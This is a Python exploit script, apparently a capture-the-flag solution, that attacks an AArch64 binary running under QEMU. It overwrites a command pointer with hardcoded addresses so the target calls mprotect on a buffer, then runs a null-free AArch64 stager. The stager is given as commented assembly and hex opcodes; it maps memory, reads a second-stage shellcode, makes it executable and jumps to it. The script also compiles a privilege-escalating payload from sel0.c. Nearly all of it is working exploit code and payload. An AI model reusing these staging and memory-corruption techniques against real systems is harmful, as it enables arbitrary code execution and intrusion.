import sys
from struct import pack
packQ = lambda x: pack('<Q', x)

def stage_el0_restricted(shellcode):
  """Gets restricted shellcode execution in el0. Used to stage unrestricted shellcode."""
  assert '\n' not in shellcode
  assert '\r' not in shellcode
  assert ' ' not in shellcode
  assert '\x00' not in shellcode
  out = ''

  elf_mprotect = 0x401B68
  elf_printf = 0x400C78

  # # This is to leak elf_buf, which comes from an mmap call.
  # # 4269929 is the decimal addr of the global containg the buf pointer within the elf.
  # # It's static, so, we only need to leak it once. Or, we could have just debugged qemu to get it.
  # sys.stdout.write("1\n4269929\n" + "yo-%s-%x-%x-%x-%x-%x".ljust(256, 'X') + packQ(elf_printf) + packQ(elf_printf) + "\n")
  # exit(0)

  elf_buf = 0x7ffeffffd000

  # Step 1: get stager payload into memory. No overflows happen here, we're just
  # looking to upload the shellcode to the global buffer. It isn't (completley)
  # overwritten by the later I/O.
  assert len(shellcode) < 256 - 8 - 2
  out += ("1\n4096\n" + "AAAAAAAA" + shellcode + "\x00\n")

  # Step 2: overwrite cmd with elf_buf & mprotect, then:
  # cmd: 1
  # idx: 0x1000
  # key: 12345
  # this runs mprotect(buf, 0x1000, 5)
  out += ("1\n4096\n" + "12345".ljust(256, "\x00") + packQ(elf_buf+8) + packQ(elf_mprotect) + "\n")

  # Step 3: we run the elf_buf.
  # cmd: 0
  # idx: anything
  # this runs buf(buf, anything, 0)
  out += ("0\n0\n")
  return out


def stage_el0(shellcode):
  """Run up to 0x1000 bytes of arbitrary shellcode in el0. 0x1000 could be raised, if needed."""
  # 401B5C mmap          mmap(0LL, (size_t)v4, 3, 0, 0, -1LL);
  # 401B50 read          read(0, &c, 1uLL)
  # 401B68 mprotect

  # Stager payload, that's suitably null-free and newline-free.
  """
# setup useful constants
mov x19, #0x0401
lsl x19, x19, #12
sub x20, x20, x20
mov x23, #0x1111
lsr x23, x23, #12
lsl x23, x23, #12

# x21 = mmap(0, 0x1000, PROT_READ|PROT_WRITE, 0, 0, -1)
mov x0, x20
mov x1, x23
mov x2, #0x310
lsr x2, x2, #8
mov x3, x20
mov x4, x20
neg x5, x20
add x10, x19, #0xb5c
blr x10
add x21, x0, #123
sub x21, x21, #123

# for(x22 = 0x1000; x22-- != 0;;) read(0, x21[i], 1);
# Note that we fill up the buffer backwards. No particular
# reason, it's just the first thing I happened to write.
mov x22, x23
readloop:
  sub x22, x22, #0x111
  add x22, x22, #0x110
  mov x0, x20
  add x1, x21, x22
  lsr x2, x23, #12
  add x10, x19, #0xb50
  blr x10
  cmp x22, x20
  bne readloop

# mprotect(x21, 0x1000, PROT_READ|PROT_EXEC)
mov x0, x21
mov x1, x23
mov x2, #0x510
lsr x2, x2, #8
add x10, x19, #0xb68
blr x10

# x21()
blr x21
  """
  stager = (
    'd2808033'.decode('hex')[::-1] +
    'd374ce73'.decode('hex')[::-1] +
    'cb140294'.decode('hex')[::-1] +
    'd2822237'.decode('hex')[::-1] +
    'd34cfef7'.decode('hex')[::-1] +
    'd374cef7'.decode('hex')[::-1] +
    'aa1403e0'.decode('hex')[::-1] +
    'aa1703e1'.decode('hex')[::-1] +
    'd2806202'.decode('hex')[::-1] +
    'd348fc42'.decode('hex')[::-1] +
    'aa1403e3'.decode('hex')[::-1] +
    'aa1403e4'.decode('hex')[::-1] +
    'cb1403e5'.decode('hex')[::-1] +
    '912d726a'.decode('hex')[::-1] +
    'd63f0140'.decode('hex')[::-1] +
    '9101ec15'.decode('hex')[::-1] +
    'd101eeb5'.decode('hex')[::-1] +
    'aa1703f6'.decode('hex')[::-1] +
    'd10446d6'.decode('hex')[::-1] +
    '910442d6'.decode('hex')[::-1] +
    'aa1403e0'.decode('hex')[::-1] +
    '8b1602a1'.decode('hex')[::-1] +
    'd34cfee2'.decode('hex')[::-1] +
    '912d426a'.decode('hex')[::-1] +
    'd63f0140'.decode('hex')[::-1] +
    'eb1402df'.decode('hex')[::-1] +
    '54ffff01'.decode('hex')[::-1] +
    'aa1503e0'.decode('hex')[::-1] +
    'aa1703e1'.decode('hex')[::-1] +
    'd280a202'.decode('hex')[::-1] +
    'd348fc42'.decode('hex')[::-1] +
    '912da26a'.decode('hex')[::-1] +
    'd63f0140'.decode('hex')[::-1] +
    'd63f02a0'.decode('hex')[::-1]
  )
  assert len(shellcode) < 0x1000
  return stage_el0_restricted(stager) + shellcode.ljust(0x1000, 'A')[::-1]


#
# stage_el0(shellcode) gets code exec in el0.
#
# The following loads "shellcode" via compiling ./sel0.c, which is an exploit
# that runs in el0 and gets code exec in s-el0.
#

from subprocess import check_output
output = check_output(('/bin/sh', '-c', r"""clang --target=aarch64 -fPIE -ffreestanding -Oz ./sel0.c -c && ld.lld -shared hexc.o -o hexc.so && objdump -Dj .text hexc.so | tee /dev/stderr | awk '/^ *[0-9a-f]*:/ {print $2}'"""))
sc = ''.join(i.strip().decode('hex')[::-1] for i in output.splitlines() if i.strip() and i.strip() != "Address") + '\x00\x00\x00\x00'
sys.stdout.write(stage_el0(sc))
